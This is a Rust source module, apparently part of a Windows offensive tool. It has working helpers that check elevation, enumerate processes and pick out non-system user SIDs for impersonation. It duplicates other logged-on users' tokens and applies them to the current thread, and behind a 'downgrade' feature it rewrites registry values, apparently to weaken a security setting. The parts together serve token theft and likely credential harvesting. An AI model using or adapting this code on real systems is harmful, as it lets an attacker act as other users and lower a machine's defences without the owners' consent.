use core::{ffi::c_void, ptr::null_mut};

use alloc::borrow::ToOwned;
use alloc::boxed::Box;
use alloc::string::String;
use alloc::vec;
use alloc::vec::Vec;

use crate::types::Sid;

use crate::win32::{
    advapi32::advapi32,
    def::{
        ObjectAttributes, SecurityImpersonationLevel, SecurityQualityOfService,
        SystemProcessInformation, TokenElevation, TokenInformationClass, TokenType, TokenUser,
        HANDLE, NT_SUCCESS, STATUS_BUFFER_TOO_SMALL, STATUS_INFO_LENGTH_MISMATCH, TOKEN_ALL_ACCESS,
        TOKEN_QUERY,
    },
    ntdll::{nt_current_process, nt_current_thread, ntdll},
};

use crate::{_print, AUTHENTICATED_USERS};

#[cfg(feature = "verbose")]
use crate::win32::{def::NT_STATUS, ntdll::nt_get_last_error};

#[cfg(feature = "downgrade")]
use crate::win32::{
    def::{KEY_READ, KEY_WRITE},
    winreg::{nt_delete_value_key, nt_open_key, nt_query_value_key, nt_set_value_key},
};

#[cfg(feature = "downgrade")]
use crate::types::RegKeyHandle;

/// Checks if the current process is running with elevated privileges (e.g., Administrator).
///
/// This function uses the `NtOpenProcessToken` API to open the current process's access token
/// and the `NtQueryInformationToken` API to query its elevation status.
///
/// # Returns
/// Returns `true` if the process is running with elevated privileges, or `false` otherwise..
pub fn is_elevated() -> bool {
    let mut token_handle: HANDLE = null_mut();

    // Open the access token of the current process.
    // TOKEN_QUERY is required to query the token information.
    let mut nt_status = unsafe {
        ntdll()
            .nt_open_process_token
            .run(nt_current_process(), TOKEN_QUERY, &mut token_handle)
    };

    if !NT_SUCCESS(nt_status) {
        // Failed to open the token, assume non-elevated.
        return false;
    }

    let mut token_elevation = TokenElevation {
        token_is_elevated: 0,
    };
    let mut return_length: u32 = 0;

    // Retrieve elevation information for the token.
    // TokenElevation determines if the token is elevated or not.
    nt_status = unsafe {
        ntdll().nt_query_information_token.run(
            token_handle,
            TokenInformationClass::TokenElevation as u32,
            &mut token_elevation as *mut _ as *mut _,
            core::mem::size_of::<TokenType>() as u32,
            &mut return_length as *mut _,
        )
    };

    if !NT_SUCCESS(nt_status) {
        // Failed to retrieve token information, assume non-elevated.
        return false;
    }

    // Check if the TokenIsElevated field is non-zero, indicating elevation.
    token_elevation.token_is_elevated != 0
}

/// Takes a snapshot of the currently running processes using `NtQuerySystemInformation`.
///
/// This function attempts to retrieve system process information using the NT API. It first calls
/// `NtQuerySystemInformation` with a zero-length buffer to determine the required buffer size,
/// then allocates the buffer and attempts to retrieve the actual process list. If it receives
/// `STATUS_INFO_LENGTH_MISMATCH` again (which can happen if processes change while retrieving data),
/// it will reallocate the buffer based on the new size and retry until successful or another error
/// occurs.
pub unsafe fn get_processes(snapshot: &mut *mut SystemProcessInformation, size: &mut usize) -> i32 {
    let mut length: u32 = 0;

    let mut status =
        ntdll()
            .nt_query_system_information
            .run(5, core::ptr::null_mut(), 0, &mut length);

    if status != STATUS_INFO_LENGTH_MISMATCH && status != 0 {
        return status;
    }

    let mut buffer = vec![0u8; length as usize].into_boxed_slice();

    loop {
        status = ntdll().nt_query_system_information.run(
            5,
            buffer.as_mut_ptr() as *mut core::ffi::c_void,
            length,
            &mut length,
        );

        if status == 0 {
            // Successfully retrieved process information
            *snapshot = buffer.as_mut_ptr() as *mut SystemProcessInformation;
            *size = length as usize;

            // Prevent the buffer from being dropped
            Box::leak(buffer);
            return status;
        }

        // If we get STATUS_INFO_LENGTH_MISMATCH again, it means the process list changed
        // between calls. We'll reallocate the buffer to the new length and try again.
        if status == STATUS_INFO_LENGTH_MISMATCH {
            buffer = vec![0u8; length as usize].into_boxed_slice();
            continue;
        }

        // Any other error is returned as-is
        return status;
    }
}

/// Retrieves the Security Identifier (SID) associated with a given token.
///
/// This function uses the `NtQueryInformationToken` API to query the `TokenUser` information
/// from the provided token handle. It then parses the SID (Security Identifier) from the
/// retrieved token information.
///
/// # Arguments
/// * `token` - A handle to the access token whose SID is being queried.
///
/// # Returns
/// Returns an `Option<String>` containing the SID value if successful, or `None` if an error occurs.
pub fn get_logon_sid(token: HANDLE) -> Option<String> {
    let mut buffer_size = 0;

    // First call to GetTokenInformation to determine the required buffer size.
    let mut nt_status = unsafe {
        ntdll().nt_query_information_token.run(
            token,
            1, // TokenUser.
            null_mut(),
            0,
            &mut buffer_size,
        )
    };

    if nt_status != STATUS_BUFFER_TOO_SMALL && !NT_SUCCESS(nt_status) {
        return None;
    }

    if buffer_size == 0 {
        return None;
    }

    // Allocate a buffer of the required size to hold the token information.
    let mut buffer: Vec<u8> = vec![0; buffer_size as usize];

    nt_status = unsafe {
        ntdll().nt_query_information_token.run(
            token,
            1, // TokenUser.
            buffer.as_mut_ptr() as *mut c_void,
            buffer_size,
            &mut buffer_size,
        )
    };

    if !NT_SUCCESS(nt_status) {
        return None;
    }

    let token_user = unsafe { &*(buffer.as_ptr() as *const TokenUser) };

    // Parse the SID from the token user structure.
    let sid = Sid::from_ptr(token_user.user.sid);

    if sid.is_none() {
        return None;
    }

    // Return the SID value as a string.
    Some(sid.unwrap().value)
}

/// Validates whether a given SID is suitable for impersonation.
///
/// This function ensures that:
/// - The SID is not empty.
/// - The SID has not already been processed for impersonation.
/// - The SID does not belong to a well-known system account.
///
/// # Arguments
/// * `sid` - The Security Identifier (SID) to validate.
///
/// # Returns
/// Returns `true` if the SID is valid for impersonation, or `false` otherwise.
pub fn validate_sid(sid: &str) -> bool {
    // List of well-known system SIDs to exclude.
    let system_sids = [
        "S-1-5-18",     // LocalSystem
        "S-1-5-19",     // LocalService
        "S-1-5-20",     // NetworkService
        "S-1-5-96-0-0", // Font Driver Host
        "S-1-5-96-0-1", // Window Manager
        "S-1-5-90-0-1", // Reserved SID
    ];

    // Ensure the SID is not empty.
    if sid.trim().is_empty() {
        return false;
    }

    // Check if the SID has already been processed.
    if unsafe { AUTHENTICATED_USERS.contains(&sid.to_owned()) } {
        return false;
    }

    // Exclude well-known system SIDs.
    if system_sids.contains(&sid) {
        return false;
    }

    true
}

/// Retrieves the username of the current user.
///
/// This function calls the Windows API `GetUserNameW` to get the username of the current user.
/// It first determines the required buffer size, then allocates the buffer and retrieves the username.
///
/// # Returns
/// - `Result<String, Box<dyn core::error::Error>>`: On success, returns the username as a `String`.
///   On failure, returns an error wrapped in a `Box<dyn core::error::Error>`.
///
/// # Errors
/// - Returns an error if `GetUserNameW` fails to retrieve the username.
pub fn get_username() -> String {
    // Retreive the entire length of the username
    let mut size = 0;

    if let Some(get_user_name_w) = unsafe { advapi32().get_user_name_w } {
        let fail = unsafe { get_user_name_w(core::ptr::null_mut(), &mut size) == 0 };
        if !fail {
            return String::new();
        }
    }

    if size == 0 {
        _print!("[-] GetUserNameW failed with error: {}", unsafe {
            nt_get_last_error()
        });
        return String::new();
    }

    // Allocate memory to put the Windows (UTF-16) string.
    let mut name: Vec<u16> = Vec::with_capacity(size.try_into().unwrap_or(usize::MAX));
    size = name.capacity().try_into().unwrap_or(u32::MAX);

    if let Some(get_user_name_w) = unsafe { advapi32().get_user_name_w } {
        let fail = unsafe { get_user_name_w(name.as_mut_ptr().cast(), &mut size) == 0 };
        if fail {
            _print!("[-] GetUserNameW failed with error: {}", unsafe {
                nt_get_last_error()
            });
            return String::new();
        }
    }

    unsafe {
        name.set_len(size.try_into().unwrap_or(usize::MAX));
    }
    let _ = name.pop(); // Remove Trailing Null

    String::from_utf16_lossy(&name)
}

/// Attempts to impersonate a logged-on user using the provided token.
///
/// This function uses the following NT APIs:
/// - `NtQueryInformationToken`: Queries the type of the provided token.
/// - `NtDuplicateToken`: Duplicates a primary token into an impersonation token if required.
/// - `NtSetInformationThread`: Sets the impersonation token for the current thread.
/// - `NtClose`: Closes the duplicated token handle if one was created.
///
/// # Arguments
/// - `h_token` - The token handle to impersonate.
///
/// # Returns
/// - `i32` - The NTSTATUS code indicating success or failure of the impersonation operation.
pub fn impersonate_logged_on_user(h_token: HANDLE) -> i32 {
    let mut new_token: HANDLE = null_mut(); // Handle for the new token.
    let mut token_type_raw: u32 = 0; // Raw value to hold the TokenType.
    let mut return_length: u32 = 0; // Length of the returned data for query calls.
    let duplicated: bool; // Indicates whether the token was duplicated.

    // Query the type of the token to determine if it's primary or impersonation.
    let mut nt_status = unsafe {
        ntdll().nt_query_information_token.run(
            h_token,
            8, // TokenType (8) indicates we are querying the type of the token.
            &mut token_type_raw as *mut _ as *mut _,
            core::mem::size_of::<TokenType>() as u32,
            &mut return_length as *mut _,
        )
    };

    if !NT_SUCCESS(nt_status) {
        _print!(
            "[-] NtQueryInformationToken failed with status: {}",
            NT_STATUS(nt_status)
        );
        return nt_status;
    }

    let token_type = unsafe { core::mem::transmute::<u32, TokenType>(token_type_raw) };

    if token_type == TokenType::TokenPrimary {
        // The token is primary; it needs to be duplicated to an impersonation token.
        _print!("[+] Token is primary; duplicating to impersonation token.");

        /* Create a duplicate impersonation token */
        let mut sqos = SecurityQualityOfService {
            length: core::mem::size_of::<SecurityQualityOfService>() as u32,
            impersonation_level: SecurityImpersonationLevel::SecurityImpersonation as u32,
            context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING.
            effective_only: 0,        // FALSE: Allows full delegation.
        };

        let mut object_attributes = ObjectAttributes {
            length: core::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: null_mut(),
            object_name: null_mut(),
            attributes: 0,
            security_descriptor: null_mut(),
            security_quality_of_service: &mut sqos as *mut _ as *mut c_void,
        };

        // Duplicate the token into an impersonation token.
        nt_status = unsafe {
            ntdll().nt_duplicate_token.run(
                h_token,
                TOKEN_ALL_ACCESS,
                &mut object_attributes,
                0,
                TokenType::TokenImpersonation as u32,
                &mut new_token,
            )
        };

        if !NT_SUCCESS(nt_status) {
            _print!(
                "[-] NtDuplicateToken failed with status: {}",
                NT_STATUS(nt_status)
            );
            return nt_status;
        }

        duplicated = true;
    } else {
        // Token is already an impersonation token.
        new_token = h_token;
        duplicated = false;
    }

    // Set the impersonation token for the current thread.
    nt_status = unsafe {
        ntdll().nt_set_information_thread.run(
            nt_current_thread(),
            5, // ThreadImpersonationToken.
            &mut new_token as *mut _ as *mut _,
            core::mem::size_of::<HANDLE>() as u32,
        )
    };

    // Close the duplicated token if one was created.
    if duplicated {
        unsafe {
            ntdll().nt_close.run(new_token);
        }
    }

    if !NT_SUCCESS(nt_status) {
        _print!(
            "[-] NtSetInformationThread failed with status: {}",
            NT_STATUS(nt_status)
        );
        return nt_status;
    }

    nt_status
}

/// Reverts the thread's impersonation token to that of the current process using the `NtSetInformationThread` API.
///
/// This function clears the thread's impersonation token by setting the `ThreadImpersonationToken` field to null.
/// It effectively restores the thread's security context to match the current process.
///
/// # Returns
/// - `i32` - The NTSTATUS code indicating success or failure.
pub fn revert_to_self() -> i32 {
    let mut token: HANDLE = null_mut();

    unsafe {
        ntdll().nt_set_information_thread.run(
            nt_current_thread(),
            5, // ThreadImpersonationToken.
            &mut token as *mut _ as *mut _,
            core::mem::size_of::<HANDLE>() as u32,
        )
    }
}

/// Retrieves the value of a registry key.
///
/// This function opens the specified registry key using `NtOpenKey`, queries the value with `NtQueryValueKey`,
/// and returns a handle to the registry key along with the queried value. If the value does not exist,
/// it returns a handle with `None` as the value.
///
/// # Parameters
/// - `key` - A string slice representing the path to the registry key.
/// - `name` - A string slice representing the name of the value to query within the registry key.
///
/// # Returns
/// - `Result<RegKeyHandle, i32>` - On success, returns a `RegKeyHandle` containing the registry key handle and the queried value.
///   On failure, returns an NTSTATUS error code.
#[cfg(feature = "downgrade")]
pub fn get_reg_key(key: &str, name: &str) -> Result<RegKeyHandle, i32> {
    let key_handle = unsafe { nt_open_key(key, KEY_READ | KEY_WRITE)? };

    let value = match unsafe { nt_query_value_key(key_handle, name) } {
        Ok(value) => Some(value),
        Err(_) => None, // Return None if the value does not exist
    };

    Ok(RegKeyHandle::new(key_handle, value))
}

/// Sets the value of a registry key or deletes it if the value is `None`.
///
/// This function opens the specified registry key using `NtOpenKey` and sets or deletes the value.
/// If the value is `None`, the key's value is deleted using `NtDeleteValueKey`.
/// If the value is provided, it is set using `NtSetValueKey`.
///
/// # Parameters
/// - `key` - A string slice representing the path to the registry key.
/// - `name` - A string slice representing the name of the value to set within the registry key.
/// - `value` - An `Option<u32>` containing the value to set. If `None`, the function deletes the key's value.
///
/// # Returns
/// - `Result<(), i32>` - On success, returns `Ok(())`. On failure, returns an NTSTATUS error code.
#[cfg(feature = "downgrade")]
pub fn set_reg_key(key: &str, name: &str, value: Option<u32>) -> Result<(), i32> {
    let key_handle = match unsafe { nt_open_key(key, KEY_READ | KEY_WRITE) } {
        Ok(handle) => handle,
        Err(_) => return Err(-1), // Return an error if the key cannot be opened
    };

    match value {
        Some(val) => {
            let status = unsafe { nt_set_value_key(key_handle, name, &val.to_ne_bytes()[..]) };
            if status != 0 {
                return Err(status);
            }
        }
        None => {
            let status = unsafe { nt_delete_value_key(key_handle, name) }; // Deletes the value if None
            if status != 0 {
                return Err(status);
            }
        }
    }

    Ok(())
}
